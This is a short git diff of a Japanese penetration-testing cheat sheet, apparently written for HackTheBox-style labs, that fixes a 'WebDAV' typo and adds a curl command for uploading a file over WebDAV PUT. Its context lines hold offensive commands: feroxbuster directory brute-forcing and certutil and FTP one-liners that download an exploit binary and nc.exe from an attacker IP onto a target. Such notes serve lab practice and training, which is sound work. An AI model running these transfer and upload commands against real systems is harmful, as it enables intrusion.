@@ -124,7 +124,7 @@ feroxbuster -u http://targethost.htb/  -x asp,aspx -w /usr/share/seclists/Discov
 ## --no-recursion
 feroxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium-directories.txt --no-recursion | tee feroxbuster.txt
 
-# WevDAVの探索
+# WebDAVの探索
 /usr/bin/davtest -url http://targethost.htb/
 ```
 
@@ -157,6 +157,9 @@ certutil.exe -URLCache -split -f http://10.10.14.3:5000/exploit exploit.exe
 # https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files
 echo open 10.10.14.3 > ftp.txt && echo user user password >> ftp.txt && echo binary >> ftp.txt && echo get nc.exe nc.exe >> ftp.txt && echo quit >> ftp.txt
 ftp -n < ftp.txt
+
+# WebDavのPUTが使える場合
+curl -T test.html http://targethost.htb
 ```
 
 よく転送するファイル
